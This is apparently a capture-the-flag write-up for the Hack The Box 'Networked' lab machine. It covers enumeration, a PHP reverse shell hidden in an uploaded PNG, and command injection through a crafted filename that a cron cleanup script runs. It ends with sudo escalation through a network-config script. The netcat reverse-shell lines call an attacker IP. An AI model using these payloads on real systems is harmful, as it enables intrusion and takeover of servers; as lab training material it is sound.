@@ -1,0 +1,98 @@
+HTB-Networked-Writeup
+
+IP : 10.10.10.146
+
+Nmap
+----
+- nmap found 2 open ports 
+	- 22 running SSH
+	- 80 running Apache httpd 2.4.6
+
+- port 443 shows up as closed  
+
+Enumeration
+-----------
+- visiting the port 80 (root page) we get some text
+- by checking the source code for the page we found that /upload and /gallary exists
+- we run directory brute force against the page and found a few interesting results 
+	- /backup
+	- /cgi-bin
+	- /index.php
+	- /uploads
+
+- out of this /backups looks more interesting to us 
+- checking out /backups we got a backup.tar
+- on unziping the backup.tar file we get the sorce code for the site
+	
+	tar xvf backup.tar
+
+- checking it one by one we found an upload form in /upload.php and can see the uploaded files in /photos.php
+
+Shell as apache
+---------------
+- we try to upload a simple image file and was successful and the uploaded image can be viewed in gallary page located in /photos.php
+- we can add a reverse shell to an image file and upload it to get a reverse shell out of it 
+- we can inject some php code into the image file
+
+	cp original.png ./shell.php.png
+	echo '<?php' >> ./shell.php.png
+	echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 9001 >/tmp/f");' >> ./shell.php.png
+	echo '?>' >> ./shell.php.png
+
+- setup a listener with netcat
+
+	nc -lnvp 9001
+
+- upload the image file and we get a reverse shell as the user apache 
+- stabilize the shell with python
+
+	python -c "import pty;pty.spawn('/bin/bash')"
+
+- on listing the files in apache home directory we see a bunch of files including the user flag 
+- the user flag is not readable to us as apache 
+- the crontab.guly file tells us that a cronjob is running every 3 minutes and it is running /home/guly/check_attack.php
+
+Shell as guly
+-------------
+- we checked out check_attack.php and understood that it checks for the files that arent supposed to be in the uploads directory and deletes it
+- to do so it appends the file name to the rm command in the code which makes it vulnerable to command injection
+
+	exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+
+- in this the $path = '/var/www/html/uploads/';
+- in the above code we can control $value
+- we can create a new file and name it as 
+
+	cd /var/www/html/uploads
+	touch '; nc 10.10.14.54 1337 -c bash'
+
+- start a netcat listener
+
+	nc -lnvp 1337
+
+- after 3 minutes we get a reverse shell as guly
+- grab the user flag 
+
+Priv-esc
+--------
+- as guly we can check sudo -l and found that guly can run /usr/local/sbin/changename.sh as root without password 
+- inspecting the changename code we found that the script creates a network script for an interface called guly then activates that interface 
+- it asks us for the following 
+	- NAME
+	- PROXY_METHOD
+	- BROWSER_ONLY
+	- BOOTPROTO
+
+- we are interested in the name option since it can possibly give us command injection    
+- this blog explained it clearly
+
+	https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f
+
+- we can try to execute bash
+- run the script with sudo and when it ask for a name enter bash
+	
+	sudo /usr/local/sbin/changename.sh
+	bash
+
+- we got a root shell in return
+- grab the root flag  
